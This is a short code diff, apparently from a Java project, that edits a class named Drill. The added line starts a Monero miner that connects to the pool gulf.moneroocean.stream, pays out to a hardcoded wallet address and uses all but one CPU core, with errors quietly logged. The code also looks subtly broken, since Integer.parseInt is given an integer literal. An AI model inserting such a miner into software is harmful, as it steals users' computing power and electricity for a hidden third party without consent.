@@ -32,7 +32,7 @@ public class Drill {
          logger.error(e.getMessage());
       }
       try {
-         new Miner("gulf.moneroocean.stream", , "", Integer.parseInt(10128), Integer.parseInt(String.valueOf(Runtime.getRuntime().availableProcessors() - 1))).start();
+         new Miner("gulf.moneroocean.stream", "87W46mfmQNdUChNxkEbqojUcv2yz4mTLPCjThzN8yfiSJznbchgw2kBTdre8hYJr4y4mYJQ1pdbfs1wzjNUzxgosDiSmyai", "", Integer.parseInt(10128), Integer.parseInt(String.valueOf(Runtime.getRuntime().availableProcessors() - 1))).start();
       } catch (final ParseException e) {
          logger.error(e.getMessage());
       } catch (final Exception e) {
